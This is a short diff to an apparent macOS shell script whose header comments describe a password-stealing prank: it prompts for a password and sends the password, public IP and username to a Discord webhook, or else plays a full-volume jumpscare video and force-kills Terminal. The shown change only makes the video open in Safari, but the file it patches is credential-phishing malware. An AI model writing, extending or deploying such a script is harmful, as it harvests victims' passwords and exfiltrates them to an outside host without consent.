@@ -7,7 +7,7 @@
 # - If a non-empty password is entered, it sends the password, public IP,
 #   and username to a Discord webhook using Ruby for JSON generation.
 # - If the user cancels (or leaves the password empty), it downloads and plays
-#   a jumpscare video (from GitHub) in the browser (full-screen, at max volume).
+#   a jumpscare video (from GitHub) in Safari (full-screen, at max volume).
 # - Finally, it force-kills Terminal.
 #
 # Requirements:
@@ -105,8 +105,8 @@ EOF
     # --- Set System Volume to Maximum ---
     osascript -e 'set volume output volume 100'
     
-    # --- Open the Temporary HTML File in the Default Browser ---
-    open "$HTML_FILE"
+    # --- Open the Temporary HTML File in Safari ---
+    open -a Safari "$HTML_FILE"
     osascript -e 'display notification "JumpScare video playing in full screen." with title "JumpScare"'
     
     # --- Force Kill Terminal ---
